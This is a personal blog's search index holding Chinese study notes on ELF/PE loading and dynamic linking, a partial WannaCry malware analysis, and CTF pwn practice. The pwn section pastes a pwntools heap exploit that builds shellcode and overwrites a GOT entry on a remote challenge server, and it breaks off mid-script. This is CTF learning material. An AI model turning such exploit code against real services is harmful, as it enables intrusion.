<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>常见加密算法</title>
      <link href="/2020/07/08/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"/>
      <url>/2020/07/08/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>程序员的自我修养(2)--装载与动态链接、库与运行库</title>
      <link href="/2020/05/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-2/"/>
      <url>/2020/05/17/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-2/</url>
      
        <content type="html"><![CDATA[<h1 id="可执行文件的装载与进程"><a href="#可执行文件的装载与进程" class="headerlink" title="可执行文件的装载与进程"></a>可执行文件的装载与进程</h1><h2 id="6-2装载的方式"><a href="#6-2装载的方式" class="headerlink" title="6.2装载的方式"></a>6.2装载的方式</h2><p>动态装入:根据程序的局部性原理,将常用的部分驻留在内存中,不常用的存放在磁盘  </p><h3 id="覆盖装入"><a href="#覆盖装入" class="headerlink" title="覆盖装入"></a>覆盖装入</h3><p>程序员手动将程序分块,并自行设计覆盖管理器来管理模块的换入换出<br>覆盖管理器的设计主要考虑的问题就是模块之间的调用依赖关系  </p><h3 id="页映射"><a href="#页映射" class="headerlink" title="页映射"></a>页映射</h3><p>虚拟内存被划分为大小相同的页,同时物理内存划分为与页同等大小的块,通过页映射建立页与块之间的关系,充分利用程序运行的局部性原理,避免程序大量数据的进出交换</p><h2 id="6-3从操作系统看可执行文件的装载"><a href="#6-3从操作系统看可执行文件的装载" class="headerlink" title="6.3从操作系统看可执行文件的装载"></a>6.3从操作系统看可执行文件的装载</h2><p>进程的建立主要分为3步:</p><ol><li>创建独立的虚拟地址空间<br> 虚拟地址空间的初始化,并没有创建空间,而是创建映射函数所需要的数据结构</li><li>读取可执行文件头,并建立虚拟空间与可执行文件的映射关系</li><li>将CPU指令寄存器设置为可执行文件入口,启动运行</li></ol><p>启动运行之时,程序并没有被真正的加载到内存中,操作系统只是依赖可执行文件头信息建立了可执行文件与虚拟内存之间的映射关系。当出现页错误时,CPU将控制权交给操作系统,操作系统依靠之前映射关系的数据结构,找到空页面所在的VMA(Virtual Memory Area,虚拟内存区域),计算出页面在可执行文件中的偏移,然后在物理内存中分配一个物理页面并建立该物理页面与对应虚拟页面的映射关系,再把控制权交给进程,进程得以继续执行  </p><h2 id="6-4进程虚拟空间分布"><a href="#6-4进程虚拟空间分布" class="headerlink" title="6.4进程虚拟空间分布"></a>6.4进程虚拟空间分布</h2><p>Linux下,系统把相同权限的段合并到一起当做一个Segment进行映射  </p><div align=center><img src="./6/运行时内存布局.png" alt="运行时内存布局"   /></div><p>这里的<code>Segment</code>指文件的执行视图,<code>Section</code>☞文件的链接视图。而Segment信息被保存在<code>Elf32_Phdr</code>数据结构中  </p><pre><code class="C++">typedef struct{    Elf32_Word    p_type;        //Segment类型，当为“LOAD”即1时，才会被映射    Elf32_Off    p_offset;          Elf32_Addr    p_vaddr;       //虚拟空间的起始地址    Elf32_Addr    p_paddr;       //物理装载地址    Elf32_Word    p_filesz;      //在文件中所占的长度    Elf32_Word    p_memsz;       //在虚拟地址空间中的长度    Elf32_Word    p_flags;       //属性，可读可写可执行    Elf32_Word    p_align;       //对齐属性} Elf32_Phdr;</code></pre><h3 id="段地址对齐"><a href="#段地址对齐" class="headerlink" title="段地址对齐"></a>段地址对齐</h3><p>在可执行文件装载中，如果采用段分别对应各个页，长度不足则独占一页的办法来装载，则会出现大量的内部碎片，空间使用效率底下。于是出现了各个段衔接部分共享一个物理页面的办法，即将该物理页面映射两次，其他的页则按照正常的页粒度进行映射。看上去像是可执行文件被逻辑上分成了以4096字节为单位的若干块，每个块都被装载到物理内存中。采用段地址对齐使得程序在虚拟内存中看上去是连续一整块  </p><h2 id="6-5Linux内核装载ELF过程简介"><a href="#6-5Linux内核装载ELF过程简介" class="headerlink" title="6.5Linux内核装载ELF过程简介"></a>6.5Linux内核装载ELF过程简介</h2><p><code>bash</code>下执行ELF文件过程：</p><ol><li><code>bash</code>会调用<code>fork</code>系统调用创建新进程，新进程调用<code>execve</code>系统调用来执行制定的elf文件，父进程会等待新进程结束</li><li><code>execve</code>的入口是<code>sys_execve</code>,它将完成参数的检查复制，调用<code>do_execve</code></li><li><code>do_execve</code>读取文件的前128字节用以判断文件格式，然后调用<code>search_binary_handle</code>来搜索匹配合适的装载处理过程，将由其完成elf文件的检查、映射、运行环境初始化、返回程序入口点等等工作</li><li>一路返回，<code>sys_execve</code>从内核态切换到用户态，EIP跳转到返回地址即入口点，开始执行</li></ol><h2 id="6-6Windows-PE-的装载"><a href="#6-6Windows-PE-的装载" class="headerlink" title="6.6Windows PE 的装载"></a>6.6Windows PE 的装载</h2><p>RVA(Relative Virtual Address，相对虚拟地址)，相对于虚拟基地址的偏移地址<br>PE装载过程：</p><ol><li>读取文件的第一个页，目的就是读取DOS头，PE头，段表</li><li>检查进程地址空间中，目标地址是否存在，该检查主要针对DLL文件</li><li>通过段表将PE中的段都映射到地址空间中相应的位置</li><li>如果装载地址不是目标地址，进行Rebasing</li><li>装载PE文件所需要的DLL文件</li><li>对PE文件中的导入符号进行解析</li><li>根据PE头中指定的参数，建立初始化堆栈</li><li>建立主线程并启动进程</li></ol><p>与装载相关的信息都保存在<code>IMAGE_OPTIONAL_HEADER</code>中，具体参考<a href="https://i1arn.github.io/2020/04/27/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-1/#IMAGE_OPTIONAL_HEADER">IMAGE_OPTIONAL_HEADER</a></p><h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><p>把链接过程推迟到运行时在进行</p><h2 id="为什么要动态链接"><a href="#为什么要动态链接" class="headerlink" title="为什么要动态链接"></a>为什么要动态链接</h2><p>静态链接的缺点：</p><ol><li>空间浪费<br> 多个程序可能就包含了一个公共库函数的多份代码,空间利用率不高</li><li>程序的更新、部署和发布麻烦<br> 一处更新则全盘跟新，使用维护不便<br>动态链接的优点：</li><li>空间节省<br> 程序共享一个模块，节省内存，同时还可以减少物理页面的换入换出，增加CPU缓存的命令率</li><li>更友好的开发测试<br> 程序被分成若干模块，各个模块间更加独立，耦合度更小</li><li>扩展性与兼容性更好<br> 动态链接使得部分程序可以跨平台编译运行</li></ol><h2 id="地址无关代码"><a href="#地址无关代码" class="headerlink" title="地址无关代码"></a>地址无关代码</h2><p>静态共享库存在地址冲突，难以升级维护等等问题<br>PIC(Position-independent Code,地址无关代码技术)：把指令中需要被修改的部分分离出来，跟数据部分放在一起，这样指令部分就可以保持不变，而每一个进程都可以拥有数据部分的副本  </p><h3 id="各种地址引用方式"><a href="#各种地址引用方式" class="headerlink" title="各种地址引用方式"></a>各种地址引用方式</h3><table><thead><tr><th align="left"></th><th align="left">指令跳转、调用</th><th align="left">数据访问</th></tr></thead><tbody><tr><td align="left">模块内部</td><td align="left">相对跳转和调用</td><td align="left">相对地址访问</td></tr><tr><td align="left">模块外部</td><td align="left">间接跳转与调用</td><td align="left">间接访问</td></tr></tbody></table><h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>地址代码无关技术可以用在共享对象上面，也可以用于执行文件，即生成PIE（Position-Independent Executable，地址无关可执行文件）</p><h2 id="延迟绑定（PLT，Procedure-Linkage-Table）"><a href="#延迟绑定（PLT，Procedure-Linkage-Table）" class="headerlink" title="延迟绑定（PLT，Procedure Linkage Table）"></a>延迟绑定（PLT，Procedure Linkage Table）</h2><p>动态链接比静态链接慢主要有两点原因：1.动态链接对全局和静态的数据访问都要进行复杂的GOT定位，然后间接寻址，对于模块间的调用也需要定位GOT，在进行跳转访问；2.程序的链接工作被推迟到运行时进行，这样动态链接程序需要不断的进行寻找、装载共享对象，并完成符号的重定位工作。为了解决这一问题，提出了PLT延迟绑定技术  </p><pre><code>bar@plt：jmp *(bar@got)push npush moduleIDjump __dl_runtime_resolve</code></pre><p>基本原理代码如上，第一次执行bar函数的时候，链接器尚未将正确的函数地址填入到GOT表中，<code>bar@got</code>保存的是下一条指令，即<code>push n</code>的地址，n是bar符号在重定位表中的下标，之后跳转到相关的函数来完成符号解析与重定位，并将正确的bar符号地址填入到got表中。</p><h3 id="got与-got-plt"><a href="#got与-got-plt" class="headerlink" title=".got与.got.plt"></a><code>.got</code>与<code>.got.plt</code></h3><p>实际实现与上面代码有些不同，ELF中，<code>.got</code>用来保存全局变量引用的地址，<code>.got.plt</code>则用来保存函数引用的地址<br><code>.got.plt</code>前三项保存的是<code>.dynamic</code>段的地址、本模块的ID，以及<code>__dl_runtime_resolve</code>的地址</p><div align=center><img src="./7/GOT中的PLT数据结构.png" alt="GOT中的PLT数据结构"   /></div>为了减少代码的重复，实际的PLT结构结构代码如下：<pre><code>PLT0：push *(GOT+4)jump *(GOT+8)……bar@plt:jump *(bar@got)push njump PLT0</code></pre><h2 id="动态链接相关结构"><a href="#动态链接相关结构" class="headerlink" title="动态链接相关结构"></a>动态链接相关结构</h2><ol><li><code>.interp</code><br> 指定动态链接器的路径  </li><li><code>.dynamic</code><br> 保存了动态链接器所需的基本信息，如依赖、动态链接符号表位置，重定位表位置，共享对象初始化代码地址等等  </li><li><code>.dynsym</code><br> Dynamic Symbol Table，保存模块之间的符号导入导出关系，只保存动态链接相关的符号，模块内部符号如模块私有变量不保存，<code>.symtab</code>往往保存了所有符号  </li><li><code>.dynstr</code><br> 动态符号字符串表，<code>.strtab</code>是静态链接时的符号字符串表</li><li><code>.rel.dyn</code>、<code>.rel.plt</code><br> <code>.rel.dyn</code>对数据引用的修正,修正的位置位于<code>.got</code>以及数据段，<code>.rel.plt</code>对函数引用的修正，修正的位置是<code>.got.plt</code>。两者类似于静态链接中的<code>.rel.text</code>与<code>.rel.data</code><br>进程堆栈初始化信息存放在环境变量指针后面  </li></ol><h2 id="动态链接的步骤和实现"><a href="#动态链接的步骤和实现" class="headerlink" title="动态链接的步骤和实现"></a>动态链接的步骤和实现</h2><h3 id="动态链接器自举"><a href="#动态链接器自举" class="headerlink" title="动态链接器自举"></a>动态链接器自举</h3><p>动态链接器有两个特殊属性，一是自身不可以依赖其他任何共享对象，二是自身所需要的全局和静态变量的重定位工作由它本身完成（即自举）。在链接器完成自举之前，不能使用任何的全局变量也不能调用函数（Got、Plt尚未完成重定位）</p><h3 id="装载共享对象"><a href="#装载共享对象" class="headerlink" title="装载共享对象"></a>装载共享对象</h3><p>完成基本自举之后，可执行文件与链接器本身的符号表进行合并，形成全局符号表，然后在<code>.dynamic</code>中寻找有<code>DT_NEEDED</code>属性的依赖共享对象，将其依赖对象名村放入装载集合，循环查找加载<br>全局符号介入：一个共享对象的全局符号被另一个共享对象的同名全局符号覆盖的现象，Linux下遵循先入为主的原则，后加入的符号如果已经存在则忽略  </p><h3 id="重定位与初始化"><a href="#重定位与初始化" class="headerlink" title="重定位与初始化"></a>重定位与初始化</h3><p>完成重定位之后，如果共享对象有<code>.init</code>段，则动态链接器会执行该段代码，用以实现共享对象特有的初始化过程，但是可执行文件中若存在<code>.init</code>，链接器不会执行，该代码由程序初始化部分代码负责执行</p><h3 id="动态链接器的实现"><a href="#动态链接器的实现" class="headerlink" title="动态链接器的实现"></a>动态链接器的实现</h3><p>本身是静态链接，Linux内核不关心文件是否可执行，就是按照文件描述将文件装载，然后把控制权转交给ELF入口地址（<code>.interp</code>或者是<code>e_entry</code>）。这样可以看出，共享库与可执行文件并没有太大的区别  </p><h2 id="显示运行时链接"><a href="#显示运行时链接" class="headerlink" title="显示运行时链接"></a>显示运行时链接</h2><p>Linux下：</p><ol><li><code>dlopen</code>打开库</li><li><code>dlsym</code>查找符号</li><li><code>dlerror</code>错误处理</li><li><code>dlclose</code>关闭库</li></ol><h1 id="Linux共享库的组织"><a href="#Linux共享库的组织" class="headerlink" title="Linux共享库的组织"></a>Linux共享库的组织</h1><p>ABI，Application Binary Interface，二进制接口<br>查找过程：首先在系统目录  系统对链接器配置文件“ld.so.conf”制定的目录中的所有库文件进行符号链接并保存在缓存“ld.so.cache”中，首先查找该缓存，如果没有就再去“/lib”和“/usr/lib”目录下查找。如若没有，则查找失败 </p><p>相关环境变量：<br>|变量名|作用|<br>|:—-|:—-|<br>|<code>LD_LIBRARY_PATH</code>|可以用来临时改变程序需要的共享库的查找路径，链接器将优先查找该路径|<br>|<code>LD_PRELOAD</code>|指令的共享库或者目标文件都会被直接装载|<br>|<code>LD_DEBUG</code>|打开链接器的调试功能，打印过程信息|</p><h1 id="Windows下的动态链接"><a href="#Windows下的动态链接" class="headerlink" title="Windows下的动态链接"></a>Windows下的动态链接</h1><h2 id="DLL简介"><a href="#DLL简介" class="headerlink" title="DLL简介"></a>DLL简介</h2><p>DLL，Dynamic—link Library，动态链接库，文件拓展名可以是dll，ocx（ocx控件），cpl（控制面板程序）</p><p><code>__declspec(dllimport)</code>从其他DLL导入的符号，<code>__declspec(dllexport)</code>本DLL导出的符号</p><p>显示运行时链接API：</p><ol><li><code>LoadLibrary</code>装载DLL到进程的地址空间</li><li><code>GetProcAddress</code>查找某个符号地址</li><li><code>FreeLibrary</code>卸载已加载的模块</li></ol><h2 id="导入表与导出表"><a href="#导入表与导出表" class="headerlink" title="导入表与导出表"></a>导入表与导出表</h2><h3 id="导出表"><a href="#导出表" class="headerlink" title="导出表"></a>导出表</h3><p>导出表：提供了一个符号名与符号地址的映射关系，将自身的函数与变量提供给其他文件使用<br><a href="https://i1arn.github.io/2020/04/27/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-1/#COFF">PE头中由一个DataDirectory数组</a>，数组的第一项保存的就是导出表的结构地址与长度<br>结构定义如下：</p><pre><code class="c++">public struct IMAGE_EXPORT_DIRECTORY{    public UInt32 Characteristics;    public UInt32 TimeDateStamp;    public UInt16 MajorVersion;    public UInt16 MinorVersion;    public UInt32 Name;    public UInt32 Base;    public UInt32 NumberOfFunctions;    public UInt32 NumberOfNames;    public UInt32 AddressOfFunctions;     // 导出地址表地址，EAT（Export Address Table）    public UInt32 AddressOfNames;     // 符号名表地址    public UInt32 AddressOfNameOrdinals;  // 名字序号对应表地址}</code></pre><p>导出重定向：将某个符号重定向到另外一个DLL，比如说XP中，调用kernel32.dll中的<code>HeapAlloc</code>函数将被重定向到ntdll.dll的<code>RtlAllocHeap</code>函数</p><h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a><a href="#IAT">导入表</a></h3><p>符号导入：程序使用到了DLL的函数或者变量，ELF中<code>.rel.dyn</code>和<code>.rel.plt</code>保存了导入的变量及符号地址，PE下则是导入表，具体表现为<code>IMAGE_IMPORT_DESCRIPTOR</code>结构体</p><pre><code class="c++">typedef struct _IMAGE_IMPORT_DESCRIPTOR {    union {        DWORD   Characteristics;                    DWORD   OriginalFirstThunk;             } DUMMYUNIONNAME;                       // 高位为1，则低31位就是序号值，否则导入名称表（INT，与IAT相同，用来绑定符号地址）    DWORD   TimeDateStamp;                      DWORD   ForwarderChain;                     DWORD   Name;                           //导入的映像名称    DWORD   FirstThunk;                     // 指向导入地址数组} IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</code></pre><h1 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h1><h2 id="进程的内存布局"><a href="#进程的内存布局" class="headerlink" title="进程的内存布局"></a>进程的内存布局</h2><div align=center><img src="./10/常见的进程内存布局.png" alt="常见的进程内存布局"   /></div><h2 id="栈与调用惯例"><a href="#栈与调用惯例" class="headerlink" title="栈与调用惯例"></a>栈与调用惯例</h2><p>参考<a href="https://i1arn.github.io/2020/03/03/%E6%A0%88%E7%9B%B8%E5%85%B3/#__cdecl%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B">__cdecl调用过程</a><br><a href="https://i1arn.github.io/2020/03/03/%E6%A0%88%E7%9B%B8%E5%85%B3/">栈相关</a>  </p><h3 id="函数返回值传递"><a href="#函数返回值传递" class="headerlink" title="函数返回值传递"></a>函数返回值传递</h3><p>三种情况，最简单的就是通过eax返回；5~8字节的对象，使用edx返回高4字节，eax返回低4字节；那要是长度超过8字节呢？<br>使用书中的源码调试很快发现了传参方法 </p><pre><code class="C++">typedef struct big_thing {    char buf[128];}big_thing;big_thing return_test() {    big_thing b;    b.buf[0] = 0;    return b;}int main() {    big_thing n = return_test();    return 1;}   </code></pre><div align=center><img src="./10/main函数的执行过程.png" alt="main函数的执行过程" /></div><div align=center><img src="./10/复制返回内容.png" alt="返回内容复制到了隐藏的参数中" /></div><p>这个过程，有意思的是这个隐藏的参数的地址在main函数的栈帧空间中，结构体从生成到返回经历了两次复制操作；可是在Linux下编译执行的时候又出现了与书本不同的地方<br>编译命令<code>gcc -g test.cpp -O0 -fno-builtin -o test</code> </p><div align=center><img src="./10/Linux下未复制返回内容.png" alt="Linux下未复制返回内容" /></div><p>与Windows下编译结果一样，也是传入了一个隐藏的参数，但是“return_test”之后“main”函数不再有其他行为，更不说“memecpy”操作。本以为是因为尚未使用n的原因，但是并不是这样的；在main函数里面添加了<code>n.buf[0]=0x64;</code>，但是编译的结果仍然一样</p><div align=center><img src="./10/使用返回对象.png" alt="使用返回对象" /></div><p>好像是在调用“return_test”的时候，传入的隐藏参数就是n的地址；与Windows的相比较，感觉这样更好吧，因为Windows下的隐藏参数同样也是在main函数的栈帧空间中的，直接使用的话可以少了两次复制，main函数的栈帧空间少了。如果这里的结构体更换为对象呢？<br>编译环境：vs2019，X64默认选项  </p><pre><code class="C++">#include&lt;stdio.h&gt;class MyClass{public:    MyClass() { puts(&quot;构造函数&quot;); };    MyClass(const MyClass&amp; temp) { puts(&quot;复制构造函数&quot;); };    MyClass&amp; operator=(const MyClass&amp; temp) {        puts(&quot;重载 = &quot;);        return *this;    };   //重载 = 操作符    ~MyClass() { puts(&quot;析构函数&quot;); };};MyClass return_test() {    MyClass b;    puts(&quot;return_test&quot;);    return b;}int main(){    MyClass haha;    haha = return_test();    return 1;}</code></pre><p>执行结果：</p><div align=center><img src="./10/Windows下返回对象.png" alt="Windows下的执行结果" /></div><p>Linux下使用G++编译之后，执行的过程与之前相同，Linux比Windows少定义了一个对象，少了一次复制构造函数的使用：</p><ol><li>main函数中调用构造函数初始化对象haha</li><li>传入隐藏的参数，在return_test中调用构造函数初始化该对象</li><li>main函数中，使用重载操作符将隐藏参数复制给对象haha</li><li>析构函数释放隐藏参数</li><li>释放对象haha</li></ol><div align=center><img src="./10/Linux下返回对象.png" alt="Linux下的执行结果" /></div><h2 id="堆与内存管理"><a href="#堆与内存管理" class="headerlink" title="堆与内存管理"></a>堆与内存管理</h2><p>进程使用系统调用的方式来申请堆空间的话性能开销太大，于是程序申请适当大小的堆，交由程序的运行库来管理堆的分配<br>Linux下提供了两个系统调用用以分配堆空间：<code>brk</code>与<code>mmap</code><br>申请的空间大小不能超过空闲内存与空闲交换空间的总和  </p><p><code>malloc</code>申请的虚拟空间是连续的，但对应的物理空间不一定连续</p><h1 id="运行库"><a href="#运行库" class="headerlink" title="运行库"></a>运行库</h1><h2 id="入口函数与程序初始化"><a href="#入口函数与程序初始化" class="headerlink" title="入口函数与程序初始化"></a>入口函数与程序初始化</h2><h3 id="glibc函数入口"><a href="#glibc函数入口" class="headerlink" title="glibc函数入口"></a>glibc函数入口</h3><p>glibc的程序入口为<code>_start</code>,由ld链接器所默认的链接脚本指定；而<code>_start</code>将执行<code>__libc_start_main</code>函数，具体里面将，设置环境变量数组、栈底地址；完成用户代码入口函数执行前后的初始化与收尾工作的注册，包含init、fini、rtld_fini（runtime loader动态链接相关收尾）；再初始化，调用用户代码入口函数；最终退出</p><h3 id="MSVC"><a href="#MSVC" class="headerlink" title="MSVC"></a>MSVC</h3><ol><li>初始化和OS版本有关的全局变量</li><li>初始化堆，使用的是<code>alloca</code>而不是<code>malloc</code>，因为目前堆还未初始化，而<code>alloca</code>是唯一可以不适用堆的动态分配机制，可以在栈上分配任意大小空间，在函数返回时自动释放</li><li>初始化I/O</li><li>获取命令行参数和环境变量</li><li>初始化C库的一些数据</li><li>调用main，并记录返回值</li><li>检查错误并返回main返回值</li></ol><h2 id="C-C-运行库"><a href="#C-C-运行库" class="headerlink" title="C/C++运行库"></a>C/C++运行库</h2><p>CRT,CRunTime-Libaray，C运行库，基本功能有启动与退出、标准函数、I/O功能的封装、堆的封装与实现、语言中的特殊功能实现、调试功能。<br>变长参数宏举例：  </p><pre><code class="C++">//gcc#define printf(args) fprintf(stdout,##args)printf(&quot;%s%d&quot;,&quot;hello&quot;,123);fprintf(stdout,&quot;%s%d&quot;,&quot;hello&quot;,123);//msvc#define printf( ...) fprintf(stdout,__VA_ARGS__)</code></pre><h1 id="系统调用与API"><a href="#系统调用与API" class="headerlink" title="系统调用与API"></a>系统调用与API</h1><p>Windows的系统调用入口号0x2E，Linux系统调用入口号0x80。Linux下的系统调用是通过EAX寄存器来存放接口号，同时EAX也将保存返回值。<br><a href="https://blog.csdn.net/sinat_26227857/article/details/44244433" target="_blank" rel="noopener">参考Linux系统调用表</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
          <category> 程序员的自我修养 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
            <tag> 编译、链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>恶意程序分析(2)</title>
      <link href="/2020/05/13/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-2/"/>
      <url>/2020/05/13/%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90-2/</url>
      
        <content type="html"><![CDATA[<p>恶意勒索软件WannaCry<br>MD5：84c82835a5d21bbcf75a61706d8ab549  </p><p>2017出现的勒索软件，现在学习一波  </p><h1 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h1><h2 id="实际运行"><a href="#实际运行" class="headerlink" title="实际运行"></a>实际运行</h2><p>在anyrun运行了一次，看了下最终效果，程序貌似并不是对所有文件进行了加密，，，</p><div align=center><img src="./运行效果图.png" alt="运行效果图"   /></div><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>使用DetectItEasy查看一波，发现好像只进行了zip加密压缩，于是习惯性的改了后缀打开，确实存在密码，IDA打开发现了一些字符串，尝试了一下，密码就是“WNcry@2ol7”。  </p><div align=center><img src="./文件解压缩.png" alt="文件解压缩"   /></div><p>成功解压缩之后，包含了许多文件，一个一个进行观察分析</p><ol><li>msg文件夹<br> 结合运行之后的实际效果，发现就是各个语言版本的要求付款信息</li><li>c.wnry<br> 直观的看，内容不是很明确，但是中间也存在一些后缀为<code>.onion</code>的域名，以及一个tor下载网址，目前tor已更新到版本9，网址过期</li><li>r.wnry<br> 一个Q&amp;A问答记录</li><li>s.wnry<br> 文件打开，开头的”PK“映入眼帘，直接改后缀”.zip“,解压发现了一个tor连接工具</li><li>u.wnry<br> 实际就是一个exe可执行文件，运行发现是最终的解压缩界面，但是相比于正常运行，界面中少了些重要数据.  </li></ol><p>完全不了解的文件有‘b.wnry’,’t.wnry‘，像极了用户文件被加密之后的样子，同时运行加压缩之后的程序发现，并不能达到直接运行原版本的效果，还是得分析原程序干了些啥  </p><h1 id="工具拿来"><a href="#工具拿来" class="headerlink" title="工具拿来"></a>工具拿来</h1><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2>]]></content>
      
      
      <categories>
          
          <category> 逆向分析 </category>
          
          <category> 恶意程序分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Malware </tag>
            
            <tag> WannaCry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>弱符号与弱引用</title>
      <link href="/2020/05/13/%E5%BC%B1%E7%AC%A6%E5%8F%B7%E4%B8%8E%E5%BC%B1%E5%BC%95%E7%94%A8/"/>
      <url>/2020/05/13/%E5%BC%B1%E7%AC%A6%E5%8F%B7%E4%B8%8E%E5%BC%B1%E5%BC%95%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>《程序员的自我修养》3.5链接的接口-符号，中提到了弱符号与强符号，弱引用与强引用，针对与书中给出的例程，在实际中出现了完全不同的效果 </p><pre><code class="c++">#include&lt;stdio.h&gt;#include&lt;pthread.h&gt;__attribute__((weak)) int pthread_create(pthread_t *thread, const pthread_attr_t *attr,                          void *(*start_routine) (void *), void *arg) ;int main(){    if(pthread_create)        printf(&quot;multi-thread\n&quot;);    else        printf(&quot;single-thread.\n&quot;);    return 1;}</code></pre><p>书中给出的编译选项：<code>gcc pthread.c -o pt</code>与<code>gcc pthread.c -l pthread -o pt</code></p><h2 id="原程序弱符号编译"><a href="#原程序弱符号编译" class="headerlink" title="原程序弱符号编译"></a>原程序弱符号编译</h2><h3 id="问题-ptread-create始终为0"><a href="#问题-ptread-create始终为0" class="headerlink" title="问题 ptread_create始终为0"></a>问题 ptread_create始终为0</h3><p>两种编译选项编译之后执行结果都是“single-thread”，<code>pthread_create</code>在符号表中的表现一致</p><div align=center><img src="./pthread_create符号.png" alt="pthread_create符号"  /></div><h2 id="跟换为弱引用编译"><a href="#跟换为弱引用编译" class="headerlink" title="跟换为弱引用编译"></a>跟换为弱引用编译</h2><pre><code class="c++">__attribute__((weakref)) int pthread_create(pthread_t *thread, const pthread_attr_t *attr,                          void *(*start_routine) (void *), void *arg)  ;</code></pre><h3 id="问题-编译失败"><a href="#问题-编译失败" class="headerlink" title="问题 编译失败"></a>问题 编译失败</h3><pre><code class="c++">printf(&quot;multi-thread\n，%x&quot;，pthread_create);                 </code></pre><p>我们尝试去打印<code>pthread_create</code>的值，<code>gcc pthread.c -l pthread -o pt</code>能够成功编译，执行打印出pthread_create地址，同时在符号表中也找到了该符号，但是<code>gcc pthread.c -o pt</code>编译出错，显示<code>undefined reference to &#39;pthread_create&#39;</code>，不是说弱引用的时候找不到定义也不报错么，为啥现在直接编译报错<br><a href="https://gcc.gnu.org/onlinedocs/gcc/Common-Function-Attributes.html#Common-Function-Attributes" target="_blank" rel="noopener">gcc函数通用属性</a>中提到了通过<code>alias</code>来设置符号的别名来使用，例如<code>__attribute__((weakref，alias(&quot;pthread_create&quot;))) int MyPthread ...</code>，编译能够通过，但是<code>MyPthread</code>符号值为0。</p><h1 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h1><p>待解答。。。</p>]]></content>
      
      
      <categories>
          
          <category> 基础编程 </category>
          
          <category> 语言基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C\C++ </tag>
            
            <tag> Code </tag>
            
            <tag> GCC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn练习</title>
      <link href="/2020/05/01/pwn%E7%BB%83%E4%B9%A0/"/>
      <url>/2020/05/01/pwn%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="adworld攻防世界"><a href="#adworld攻防世界" class="headerlink" title="adworld攻防世界"></a>adworld攻防世界</h1><h2 id="supermarket"><a href="#supermarket" class="headerlink" title="supermarket"></a>supermarket</h2><p>溢出点：在命令5修改商品描述的时候，会请求用户输入大小，调用realloc调整空间，但是在之后获取输入的时候最大长度还是第一次输入的长度，可能造成溢出<br>而商品的结构体中依次保存的是商品名，价格，描述内容大小，描述内容指针，我们可以尝试通过修改指针指向来向合适的地址写入合适的内容  </p><h2 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=1&id=4611&page=1" target="_blank" rel="noopener">题目链接</a><br>想尝试利用现有的一些shellcode，但是都不能满足要求，<a href="http://p4nda.top/2018/05/13/ciscn-ctf-2018/" target="_blank" rel="noopener">粘贴一下P4nda的wp</a>，学一下shellcode编写  </p><pre><code class="Python">from pwn import *from ctypes import *debug = 0elf = ELF(&#39;./1f10c9df3d784b5ba04b205c1610a11e&#39;)context.update(arch = &#39;amd64&#39;)if debug:    p = process(&#39;./1f10c9df3d784b5ba04b205c1610a11e&#39;)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)    context.log_level = &#39;debug&#39;    gdb.attach(p)else:    p = remote(&#39;117.78.43.123&#39;, 31128)    libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def add(index,content):    p.recvuntil(&#39;your choice&gt;&gt;&#39;)    p.sendline(&#39;1&#39;)    p.recvuntil(&#39;index&#39;)    p.sendline(str(index))    p.recvuntil(&#39;size&#39;)    p.sendline(str(8))        p.recvuntil(&#39;content&#39;)    p.send(content)add(0,&#39;/bin/sh&#39;)add((elf.got[&#39;free&#39;]-0x2020A0)/8,asm(&#39;xor rsi,rsi&#39;)+&#39;\x90\x90\xe9\x16&#39;)add(1,asm(&#39;push 0x3b\n pop rax&#39;)+&#39;\x90\x90\xe9\x16&#39;)add(2,asm(&#39;xor 